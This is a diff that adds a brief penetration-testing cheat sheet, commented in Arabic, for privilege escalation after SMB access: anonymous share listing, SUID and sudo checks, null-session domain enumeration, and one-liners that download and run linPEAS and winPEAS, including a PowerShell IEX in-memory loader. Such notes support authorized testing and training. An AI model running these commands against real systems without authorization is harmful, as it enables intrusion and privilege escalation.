@@ -1,0 +1,10 @@
+# SMB/NetBIOS PrivEsc (139/445)
+# بعد وصول مشاركة: ابحث عن مجلدات كتابة/نشر تلقائي (logon scripts, startup)
+smbclient //<target>/share -N                     # استعراض/رفع ملفات
+find / -perm -4000 -type f 2>/dev/null            # SUID
+sudo -l                                           # sudo
+rpcclient -U "" -N <target> -c "enumdomusers; enumdomgroups"   # معلومات نطاق
+# Windows/Linux:
+# Linux: linPEAS  | Windows: winPEAS/Seatbelt/PowerUp
+wget https://.../linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://.../winPEAS.ps1')"   # مثال
